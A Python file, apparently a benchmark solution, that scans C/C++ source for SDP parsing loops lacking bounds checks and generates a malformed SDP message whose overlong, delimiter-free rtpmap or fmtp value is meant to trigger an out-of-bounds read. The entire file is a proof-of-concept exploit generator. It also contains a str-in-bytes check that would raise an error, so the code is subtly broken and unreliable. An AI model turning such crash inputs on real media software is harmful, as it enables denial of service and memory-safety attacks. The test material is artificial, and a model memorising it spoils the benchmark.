import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_source_files(self, src_path: str) -> Iterable[Tuple[str, bytes]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inl", ".inc")
        max_size = 1_500_000

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.lower().endswith(exts):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                        if st.st_size <= 0 or st.st_size > max_size:
                            continue
                        with open(p, "rb") as f:
                            data = f.read()
                        yield p, data
                    except Exception:
                        continue
            return

        if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name
                        low = name.lower()
                        if not low.endswith(exts):
                            continue
                        if m.size <= 0 or m.size > max_size:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if not f:
                                continue
                            data = f.read()
                            yield name, data
                        except Exception:
                            continue
            except Exception:
                return

    def _pick_trigger(self, src_path: str) -> str:
        # Return one of: "rtpmap", "fmtp"
        # Heuristic: look for SDP parsing code that uses an unbounded while loop searching for '/' or '='
        # in a value without checking end.
        score: Dict[str, int] = {"rtpmap": 0, "fmtp": 0}

        # Common patterns of vulnerable loops
        while_ptr_delim = re.compile(r"while\s*\(\s*\*\s*[A-Za-z_]\w*\s*!=\s*'([^']+)'\s*\)")
        while_idx_value = re.compile(r"while\s*\(\s*[A-Za-z_]\w*\s*\[\s*[A-Za-z_]\w*\s*\]\s*!=\s*'([^']+)'\s*\)")
        while_value_at = re.compile(r"while\s*\(\s*[A-Za-z_]\w*\.at\(\s*[A-Za-z_]\w*\s*\)\s*!=\s*'([^']+)'\s*\)")

        for path, data in self._iter_source_files(src_path):
            low_path = path.lower()
            if "sdp" not in low_path and "session description" not in data.lower():
                # Still consider files with rtpmap/fmtp keywords even if path doesn't contain sdp
                dl = data.lower()
                if b"rtpmap" not in dl and b"fmtp" not in dl:
                    continue

            try:
                s = data.decode("utf-8", "ignore")
            except Exception:
                continue
            sl = s.lower()
            if "rtpmap" in sl:
                # Look for an unbounded loop searching for '/'
                for rgx in (while_ptr_delim, while_idx_value, while_value_at):
                    for m in rgx.finditer(s):
                        if m.group(1) == "/":
                            # Avoid counting loops that already include an end check in the condition
                            cond_start = max(0, m.start() - 120)
                            cond_end = min(len(s), m.end() + 120)
                            cond = s[cond_start:cond_end]
                            if ("end" in cond.lower() and ("<" in cond or "!=" in cond)) or ("value.end" in cond.lower()):
                                continue
                            score["rtpmap"] += 3
                            break
                    if score["rtpmap"]:
                        break
                if "parse" in sl and "rtpmap" in sl:
                    score["rtpmap"] += 1

            if "fmtp" in sl:
                # Look for unbounded loops searching for '=' or ';'
                for rgx in (while_ptr_delim, while_idx_value, while_value_at):
                    for m in rgx.finditer(s):
                        if m.group(1) in ("=", ";"):
                            cond_start = max(0, m.start() - 120)
                            cond_end = min(len(s), m.end() + 120)
                            cond = s[cond_start:cond_end]
                            if ("end" in cond.lower() and ("<" in cond or "!=" in cond)) or ("value.end" in cond.lower()):
                                continue
                            score["fmtp"] += 3
                            break
                    if score["fmtp"]:
                        break
                if "parse" in sl and "fmtp" in sl:
                    score["fmtp"] += 1

        # Prefer the stronger signal
        if score["rtpmap"] > score["fmtp"] and score["rtpmap"] > 0:
            return "rtpmap"
        if score["fmtp"] > 0:
            return "fmtp"
        # Default fallback
        return "fmtp"

    def solve(self, src_path: str) -> bytes:
        trigger = self._pick_trigger(src_path)

        # Long token to defeat small-string optimization and ensure the vulnerable scan runs past end-of-value.
        token = "A" * 256

        lines: List[str] = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "t=0 0",
            "m=audio 9 RTP/AVP 96",
        ]

        if trigger == "rtpmap":
            # Missing '/' in encoding field can trigger an unbounded scan for '/' in some parsers.
            lines.append(f"a=rtpmap:96 {token}")
        else:
            # Missing '=' / ';' in fmtp params can trigger unbounded scan in some parsers.
            lines.append("a=rtpmap:96 OPUS/48000/2")
            lines.append(f"a=fmtp:96 {token}")

        # No trailing CRLF so the final value ends at end-of-buffer.
        sdp = "\r\n".join(lines)
        return sdp.encode("ascii", "strict")